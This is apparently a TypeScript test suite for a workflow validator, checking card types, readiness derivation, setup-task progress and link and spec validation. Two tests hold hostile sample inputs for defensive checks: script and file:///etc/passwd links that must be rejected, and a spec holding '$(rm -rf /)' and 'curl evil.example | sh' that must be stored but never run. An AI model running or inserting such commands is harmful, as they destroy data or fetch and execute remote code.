import assert from "node:assert/strict";
import test from "node:test";
import { validateWorkflow } from "../src/graph/validate.ts";
import {
  readinessSummary,
  setupComplete,
  setupProgress,
  type WorkflowDefinition,
} from "../src/graph/types.ts";
import { card, emptyWorkflow, setupTask } from "./fixtures.ts";

function expectIssue(input: unknown, code: string) {
  const result = validateWorkflow(input);
  assert.equal(result.ok, false, `expected ${code}, but the document validated`);
  if (!result.ok) {
    assert.ok(
      result.issues.some((issue) => issue.code === code),
      `expected issue ${code}, got: ${result.issues.map((i) => i.code).join(", ")}`,
    );
  }
}

test("accepts all six card types", () => {
  for (const type of ["task", "agent", "integration", "approval", "artifact", "note"]) {
    const result = validateWorkflow(emptyWorkflow({ nodes: [card("n", { type })] }));
    assert.equal(result.ok, true, `${type} should be a valid card type`);
  }
});

test("rejects the retired v1 gate card type", () => {
  expectIssue(emptyWorkflow({ nodes: [card("n", { type: "gate" })] }), "invalid_node");
});

test("refuses readiness that only a real run could establish", () => {
  for (const readiness of ["tested", "operational"]) {
    expectIssue(
      emptyWorkflow({ nodes: [card("n", { readiness })] }),
      "readiness_requires_run_evidence",
    );
  }
});

test("accepts the three design-time readiness values", () => {
  for (const readiness of ["proposed", "not_configured", "configured"]) {
    const result = validateWorkflow(emptyWorkflow({ nodes: [card("n", { readiness })] }));
    assert.equal(result.ok, true, `${readiness} should be settable at design time`);
  }
});

function storedReadiness(readiness: string, setup: unknown[]): string {
  const result = validateWorkflow(emptyWorkflow({ nodes: [card("n", { readiness, setup })] }));
  assert.equal(result.ok, true, `expected the card to validate, got ${JSON.stringify(result)}`);
  return (result as { value: WorkflowDefinition }).value.nodes[0]!.readiness;
}

test("an approved card becomes configured once every setup task is checked", () => {
  const allDone = [setupTask("s1", { done: true }), setupTask("s2", { done: true })];
  assert.equal(storedReadiness("not_configured", allDone), "configured");
  assert.equal(storedReadiness("configured", allDone), "configured");
});

test("claiming configured with an unchecked task is corrected, not rejected", () => {
  const partial = [setupTask("s1", { done: true }), setupTask("s2", { done: false })];
  assert.equal(storedReadiness("configured", partial), "not_configured");
  assert.equal(storedReadiness("not_configured", partial), "not_configured");
});

test("an approved card with no setup tasks is configured", () => {
  assert.equal(storedReadiness("not_configured", []), "configured");
});

test("a proposed card stays proposed however complete its checklist is", () => {
  assert.equal(storedReadiness("proposed", [setupTask("s1", { done: true })]), "proposed");
  assert.equal(storedReadiness("proposed", []), "proposed");
});

test("deriving readiness never produces a run-evidence state", () => {
  for (const readiness of ["proposed", "not_configured", "configured"]) {
    for (const setup of [[], [setupTask("s1", { done: true })], [setupTask("s1", { done: false })]]) {
      const stored = storedReadiness(readiness, setup);
      assert.ok(
        stored !== "tested" && stored !== "operational",
        `${readiness} with ${setup.length} task(s) derived ${stored}`,
      );
    }
  }
});

test("rejects a setup task link that is not an http(s) URL", () => {
  for (const link of [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "not a url",
  ]) {
    expectIssue(
      emptyWorkflow({ nodes: [card("n", { setup: [setupTask("s1", { link })] })] }),
      "unsafe_link",
    );
  }
});

test("accepts an empty or https setup task link", () => {
  for (const link of ["", "https://hermes-agent.nousresearch.com/docs"]) {
    const result = validateWorkflow(
      emptyWorkflow({ nodes: [card("n", { setup: [setupTask("s1", { link })] })] }),
    );
    assert.equal(result.ok, true, `${link || "(empty)"} should be allowed`);
  }
});

test("rejects a spec that is not valid JSON, and keeps one that is", () => {
  expectIssue(emptyWorkflow({ nodes: [card("n", { spec: "{not json" })] }), "invalid_spec");

  const spec = '{"prompt": "Write a draft from the research"}';
  const result = validateWorkflow(emptyWorkflow({ nodes: [card("n", { spec })] }));
  assert.equal(result.ok, true);
  if (result.ok) {
    assert.equal(result.value.nodes[0]?.spec, spec);
  }
});

test("a spec is stored verbatim and never interpreted", () => {
  const spec = '{"prompt": "$(rm -rf /)", "shell": "curl evil.example | sh"}';
  const result = validateWorkflow(emptyWorkflow({ nodes: [card("n", { spec })] }));
  assert.equal(result.ok, true);
  if (result.ok) assert.equal(result.value.nodes[0]?.spec, spec);
});

test("requires a proposal with both ownership lists", () => {
  expectIssue(emptyWorkflow({ nodes: [card("n", { proposal: undefined })] }), "invalid_node");
  expectIssue(
    emptyWorkflow({ nodes: [card("n", { proposal: { agentOwns: [] } })] }),
    "invalid_node",
  );
});

test("preserves who owns what on a card", () => {
  const proposal = {
    agentOwns: ["Write the draft from the research only", "Mark any claim without a source"],
    youOwn: ["Set tone, length and audience", "Approve the outline before drafting"],
  };
  const result = validateWorkflow(
    emptyWorkflow({ nodes: [card("draft", { type: "agent", proposal })] }),
  );
  assert.equal(result.ok, true);
  if (result.ok) {
    assert.deepEqual(result.value.nodes[0]?.proposal, proposal);
  }
});

test("reports setup progress and completion for a card", () => {
  const result = validateWorkflow(
    emptyWorkflow({
      nodes: [
        card("a", { setup: [setupTask("s1", { done: true }), setupTask("s2", { done: false })] }),
        card("b", { setup: [] }),
      ],
    }),
  );
  assert.equal(result.ok, true);
  if (!result.ok) return;

  const [partial, empty] = result.value.nodes;
  assert.deepEqual(setupProgress(partial!), { done: 1, total: 2 });
  assert.equal(setupComplete(partial!), false);
  assert.deepEqual(setupProgress(empty!), { done: 0, total: 0 });
  assert.equal(setupComplete(empty!), true);
});

test("summarises readiness across the canvas", () => {
  const result = validateWorkflow(
    emptyWorkflow({
      nodes: [
        card("a", { readiness: "proposed" }),
        card("b", { readiness: "proposed" }),
        // An approved card stays not_configured only while a task is open.
        card("c", { readiness: "not_configured", setup: [setupTask("s1", { done: false })] }),
        card("d", { readiness: "configured" }),
      ],
    }),
  );
  assert.equal(result.ok, true);
  if (!result.ok) return;

  const summary = readinessSummary(result.value as WorkflowDefinition);
  assert.equal(summary.cards, 4);
  assert.equal(summary.proposed, 2);
  assert.equal(summary.not_configured, 1);
  assert.equal(summary.configured, 1);
  assert.equal(summary.tested, 0);
  assert.equal(summary.operational, 0);
});
